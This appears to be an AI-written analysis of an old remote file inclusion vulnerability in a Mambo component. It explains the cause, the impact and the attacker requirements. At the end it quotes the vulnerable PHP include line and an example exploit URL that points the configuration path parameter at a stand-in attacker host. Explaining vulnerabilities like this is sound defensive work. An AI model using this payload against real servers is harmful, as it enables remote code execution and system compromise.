Based on the provided information, here's an analysis of CVE-2006-4858:

**Root cause of vulnerability:**
The vulnerability is due to an insecure `require_once` function call within the `install.serverstat.php` file of the `com_serverstat` component for Mambo. This function call is attempting to include a configuration file but it doesn't properly sanitize the `mosConfig_absolute_path` parameter, which comes from user input.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is a Remote File Inclusion. By manipulating the `mosConfig_absolute_path` parameter, an attacker can force the application to include a remote file from an attacker-controlled server.

**Impact of exploitation:**
- **Arbitrary Code Execution:** Successfully exploiting this vulnerability allows an attacker to execute arbitrary code on the server by including and running a malicious PHP file they control. This can lead to complete compromise of the system, including data theft, malware installation, and further attacks.

**Attack vectors:**
- **HTTP GET Request:** The vulnerability is exploited through a crafted HTTP GET request targeting the `install.serverstat.php` file. The attacker modifies the `mosConfig_absolute_path` parameter with a URL pointing to a malicious PHP file.

**Required attacker capabilities/position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
- **Ability to host a malicious PHP file:**  The attacker needs a server to host the malicious PHP file that will be included by the vulnerable application.

**Technical Details:**
The vulnerable code is:
```php
require_once($mosConfig_absolute_path."/administrator/components/com_serverstat/config.serverstat.php");
```
The exploit example given is:
```
administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=http://evil_scripts?
```
This demonstrates how the attacker uses the `mosConfig_absolute_path` parameter to specify an external URL.
